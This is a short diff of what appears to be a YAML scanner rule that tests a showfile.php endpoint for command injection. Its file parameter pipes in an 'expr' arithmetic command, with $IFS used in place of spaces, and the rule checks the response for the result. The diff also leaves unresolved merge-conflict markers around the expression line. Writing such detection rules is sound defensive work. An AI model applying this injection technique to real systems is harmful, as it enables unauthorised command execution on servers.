@@ -6,4 +6,8 @@ rules:
   - method: GET
     path: /showfile.php?file=|expr$IFS"{{r1}}"$IFS-$IFS"{{r2}}"
     follow_redirects: false
+<<<<<<< HEAD
     expression: response.body.bcontains(bytes(string(r1 - r2)))
+=======
+    expression: response.body.bcontains(bytes(string(r1-r2)))
+>>>>>>> af2bc61e95655c98a5bec4002239202570b5a319
